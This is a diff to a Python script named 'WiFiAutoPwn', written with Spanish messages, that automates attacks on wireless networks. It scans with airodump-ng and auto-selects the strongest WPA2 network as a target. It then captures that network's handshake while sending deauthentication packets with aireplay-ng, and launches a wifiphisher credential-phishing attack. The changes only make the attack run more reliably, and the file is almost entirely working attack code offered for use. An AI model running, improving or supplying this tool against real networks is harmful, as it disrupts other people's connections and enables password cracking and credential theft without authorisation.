@@ -58,38 +58,61 @@ class WiFiAutoPwn:
         print(f"[*] Iniciando modo monitor en {self.interface}...")
         self._run_command(f"sudo airmon-ng start {self.interface}")
 
-    def scan_networks(self, duration: int = 10) -> List[WiFiNetwork]:
+    def scan_networks(self, duration: int = 15) -> List[WiFiNetwork]:
         print("[*] Escaneando redes...")
-        output_file = f"/tmp/scan_{int(time.time())}.csv"
-        cmd = f"sudo {AIRODUMP} -w {output_file.replace('.csv', '')} --output-format csv {self.monitor_interface}"
+        output_base = f"/tmp/scan_{int(time.time())}"
+        output_file = f"{output_base}-01.csv"
+        cmd = f"sudo {AIRODUMP} -w {output_base} --output-format csv {self.monitor_interface}"
         self._run_command(cmd, background=True)
         time.sleep(duration)
         self._run_command(f"sudo pkill -f {AIRODUMP}")
 
+        # Esperar un momento para que el archivo se cree
+        timeout = 5
+        waited = 0
+        while not os.path.exists(output_file) and waited < timeout:
+            time.sleep(1)
+            waited += 1
+
+        if not os.path.exists(output_file):
+            print("[!] No se encontró el archivo de salida. Verifica la interfaz y el tiempo de escaneo.")
+            return []
+
         networks = []
         try:
-            with open(f"{output_file}-01.csv", "r") as f:
-                for line in f.readlines()[3:]:
+            with open(output_file, "r") as f:
+                lines = f.readlines()
+                # Ignorar las primeras tres líneas (cabecera)
+                for line in lines[3:]:
                     if "Station" in line:
                         break
                     parts = re.split(r'\s*,\s*', line.strip())
                     if len(parts) >= 14:
+                        try:
+                            power = int(parts[8].strip())
+                        except ValueError:
+                            power = 0
                         networks.append(WiFiNetwork(
                             bssid=parts[0].strip(),
                             channel=parts[3].strip(),
                             essid=parts[13].strip()[1:-1],
-                            power=int(parts[8].strip()),
+                            power=power,
                             encryption=parts[5].strip()
                         ))
-        except FileNotFoundError:
-            print("[!] No se encontró el archivo de salida. Puede haber fallado la captura.")
+        except Exception as e:
+            print(f"[!] Error al leer el archivo: {e}")
         return networks
 
     def select_target(self, networks: List[WiFiNetwork]):
+        if not networks:
+            raise ValueError("No se encontraron redes para seleccionar un objetivo.")
         target = max(
             [n for n in networks if 'WPA2' in n.encryption],
-            key=lambda x: x.power
+            key=lambda x: x.power,
+            default=None
         )
+        if target is None:
+            raise ValueError("No se encontró una red WPA2 adecuada.")
         self.target = target
         print(f"[+] Objetivo seleccionado: {target.essid} ({target.bssid})")
 
@@ -97,14 +120,15 @@ class WiFiAutoPwn:
         if not self.target:
             raise ValueError("No se ha seleccionado objetivo")
         print("[*] Iniciando captura de handshake...")
-        output_file = f"/tmp/handshake_{self.target.essid}_{int(time.time())}"
-        capture_cmd = f"sudo {AIRODUMP} -c {self.target.channel} --bssid {self.target.bssid} -w {output_file} {self.monitor_interface}"
+        output_base = f"/tmp/handshake_{self.target.essid}_{int(time.time())}"
+        capture_cmd = f"sudo {AIRODUMP} -c {self.target.channel} --bssid {self.target.bssid} -w {output_base} {self.monitor_interface}"
         self._run_command(capture_cmd, background=True)
         deauth_cmd = f"sudo {AIREPLAY} -0 10 -a {self.target.bssid} {self.monitor_interface}"
         self._run_command(deauth_cmd, background=True)
         time.sleep(attack_time)
-        if os.path.exists(f"{output_file}-01.cap"):
-            self.handshake = Handshake(self.target.bssid, self.target.essid, f"{output_file}-01.cap")
+        cap_file = f"{output_base}-01.cap"
+        if os.path.exists(cap_file):
+            self.handshake = Handshake(self.target.bssid, self.target.essid, cap_file)
             print("[+] Handshake capturado!")
         else:
             print("[!] No se capturó handshake")
@@ -117,13 +141,15 @@ class WiFiAutoPwn:
         self._run_command(phisher_cmd, background=True)
 
 if __name__ == "__main__":
-    # Si se pasa un argumento de línea de comandos, se utiliza; de lo contrario se solicita la interfaz
     if len(sys.argv) > 1:
         interface = sys.argv[1]
     else:
         interface = input("Interfaz WiFi (ej: wlan0): ").strip()
     tool = WiFiAutoPwn(interface)
     networks = tool.scan_networks()
+    if not networks:
+        print("[!] No se detectaron redes. Revisa la configuración o el tiempo de escaneo.")
+        sys.exit(1)
     for i, net in enumerate(networks):
         print(f"{i+1}. {net.essid} ({net.bssid}) - {net.encryption}")
     tool.select_target(networks)
@@ -134,3 +160,4 @@ if __name__ == "__main__":
         tool.wifiphisher_attack()
     else:
         print("[!] Opción inválida")
+
